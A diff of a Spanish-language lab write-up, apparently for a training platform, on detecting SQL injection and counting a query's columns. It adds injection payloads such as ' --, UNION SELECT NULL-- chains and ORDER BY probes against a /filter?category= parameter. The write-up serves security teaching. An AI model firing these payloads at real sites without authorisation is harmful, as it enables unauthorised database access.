@@ -34,48 +34,58 @@ La consulta utilizada en el laboratorio tendrá un aspecto similar a
 SELECT * FROM tabla WHERE category = '<CATEGORY>'
 ```
 
-Comprobamos que es vulnerable a SQLi insertando en la url parametros:
+Comprobamos que es vulnerable a SQLi insertando en la url el parametro:
+
+```sql
+' --
+```
 
 ![Comprobar]({{site.url}}/images/SQLi/sqli-3/comprobar.png)
 
 ## Determinar el numero de columnas retornadas por la consulta
 
-1) La consulta de forma interna se veria algo asi con el primer metodo para mirar las columnas:
+1) El payload se veria asi con NULL:
 
-```sql
-SELECT ? FROM tabla UNION SELECT NULL
-SELECT ? FROM tabla UNION SELECT NULL, NULL
-SELECT ? FROM tabla UNION SELECT NULL, NULL, NULL
+```javascript
+/filter?category=Gifts' UNION SELECT NULL--
+/filter?category=Gifts' UNION SELECT NULL, NULL--
+/filter?category=Gifts' UNION SELECT NULL, NULL, NULL--
 ```
 
 Vamos insertando `NULL` con `UNION SELECT` para ver cuantas columnas estan disponibles etc...
 
 2) Probamos con `ORDER BY` para ver que cantidad son vulnerables, vamos incrementando el numero
 
-```sql
-SELECT a,b FROM tabla ORDER BY 1
-SELECT a,b FROM tabla ORDER BY 2
-SELECT a,b FROM tabla ORDER BY 3
+```javascript
+/filter?category=Gifts' ORDER BY 1--
+/filter?category=Gifts' ORDER BY 2--
+/filter?category=Gifts' ORDER BY 3--
 ```
 
-## Forma determinal con NULL
-```sql
+## Forma determinar con NULL
+
+```javascript
 filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
 ```
 La web para a realizar el `URL ENCONDE` y quedaria algo asi:
+
 ![url enconde]({{site.url}}/images/SQLi/sqli-3/NULL.png)
 
 En BurpSuite se veria de la siguiente forma
+
 ![BurpSuite]({{site.url}}/images/SQLi/sqli-3/burp.png)
 
-## Forma determinal con ORDER BY
-```sql
+## Forma determinar con ORDER BY
+
+```javascript
 filter?category=Gifts' ORDER BY 3--
 ```
-Sin Url Encode
+Sin Url Encode:
+
 ![url]({{site.url}}/images/SQLi/sqli-3/url.png)
 
-La web para a realizar el `URL ENCONDE` y quedaria algo asi:
+El navegador hace `URL ENCONDE` y quedaria algo asi:
+
 ![url_enconde]({{site.url}}/images/SQLi/sqli-3/url encode.png)
 
 Aprobado
